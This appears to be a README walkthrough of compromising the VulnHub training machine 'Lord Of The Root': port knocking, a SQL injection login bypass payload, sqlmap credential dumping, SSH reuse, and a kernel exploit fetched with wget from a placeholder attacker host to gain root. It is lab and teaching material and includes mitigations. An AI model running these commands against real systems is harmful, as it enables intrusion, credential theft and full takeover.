# Lord-Of-The-Root---VulnHub-Walkthrough
Exploited a SQL Injection vulnerability to bypass authentication, dumped database credentials using SQLMap, gained SSH access as a valid user, and escalated privileges to root via a local kernel exploit.
📌 Overview

This repository contains a complete walkthrough of compromising the Lord Of The Root machine from initial reconnaissance to full root access.

The machine was exploited using:

Port Knocking
SQL Injection Authentication Bypass
Database Enumeration
Credential Reuse
Local Privilege Escalation
🛠 Tools Used
Tool	Purpose
Nmap	Port Scanning & Service Detection
Knock	Port Knocking
FFUF	Directory Enumeration
Burp Suite	Request Interception & SQLi Testing
SQLMap	Automated SQL Injection Exploitation
Searchsploit	Privilege Escalation Research
GCC	Compile Local Exploit
SSH	Remote Access
🔎 Reconnaissance

Initial scan was performed using Nmap:

nmap -sC -sV -p- 192.168.10.7
Result

Only the SSH service was visible initially.

22/tcp open ssh

Attempted SSH access:

ssh 192.168.10.7

However, the username was unknown and login failed.

While investigating further, a hint saying:

Easy as 1 2 3

was discovered.

🚪 Port Knocking

The hint suggested the use of port knocking.

Used the Knock tool:

knock -v 192.168.10.7 1 2 3

After successful knocking, another Nmap scan was performed:

nmap -p- 192.168.10.7
Result

A new port was opened:

22/tcp open ssh
1337/tcp open http
🌐 Web Enumeration

Visited the web service:

http://192.168.10.7:1337

Directory fuzzing was performed using FFUF.

ffuf -u http://192.168.10.7:1337/FUZZ -w /usr/share/wordlists/dirb/common.txt
Discovery

A directory named:

404.html

was identified.

Opening the page showed nothing interesting initially.

While inspecting the page source, an encoded message was discovered.

🔐 Decoding Hidden Message

The encoded message was decoded using echo and Base64 decoding.

The message was encoded twice.

Example:

echo "ENCODED_TEXT" | base64 -d

After decoding twice, the hidden directory was revealed:

/978345210/index.php
🔑 Login Panel Discovery

Browsing to the hidden directory revealed a login panel.

http://192.168.10.7:1337/978345210/index.php
💉 SQL Injection Authentication Bypass

The login form was tested for SQL Injection using Burp Suite.

Payload used:

' OR 1=1-- -

Authentication bypass was successful and access to the panel was gained.

🗄 Database Enumeration with SQLMap

The authenticated login request was captured using Burp Suite and saved into a file:

root1.txt

SQLMap was then used to enumerate the backend database.

Identify Database
sqlmap -r root1.txt --dbs
Result
webapp
Extract Tables
sqlmap -r root1.txt -D webapp --tables
Dump User Credentials
sqlmap -r root1.txt -D webapp -T users --dump
Credentials Found
Username: smeagol
Password: MyPreciousR00t
🖥 Initial Shell Access

SSH access was attempted using the discovered credentials.

ssh smeagol@192.168.10.7

Login was successful.

🔍 System Enumeration

System information was gathered:

uname -a
lsb_release -a
Result
Ubuntu 14.04
👑 Privilege Escalation

Searchsploit was used to identify possible local privilege escalation exploits.

searchsploit ubuntu 14.04

A suitable exploit was identified:

39166.c

The exploit was transferred to the target machine and compiled.

Transfer Exploit
wget http://ATTACKER_IP/39166.c
Compile Exploit
gcc 39166.c -o exploit
Execute Exploit
./exploit
💀 Root Access Achieved

The exploit successfully spawned a root shell.

root@LordOfTheRoot:/#

Machine fully compromised.

📸 Screenshots To Add

Add screenshots for:

Initial Nmap Scan
Port Knocking
Second Nmap Scan
FFUF Output
Encoded Message
Decoding Process
Login Panel
Burp Suite SQLi
SQLMap Database Dump
SSH Access
Privilege Escalation
Root Shell
🛡 Mitigation
Disable unnecessary port knocking exposure
Sanitize user inputs against SQL Injection
Use parameterized queries
Store passwords securely using strong hashing
Keep Linux kernel updated
Restrict sensitive files and hidden directories
Implement Web Application Firewall (WAF)
🧠 Lessons Learned

This machine demonstrated:

Real-world enumeration techniques
Importance of hidden services
SQL Injection exploitation workflow
Credential harvesting
Linux privilege escalation methodology
Chaining multiple vulnerabilities for full compromise
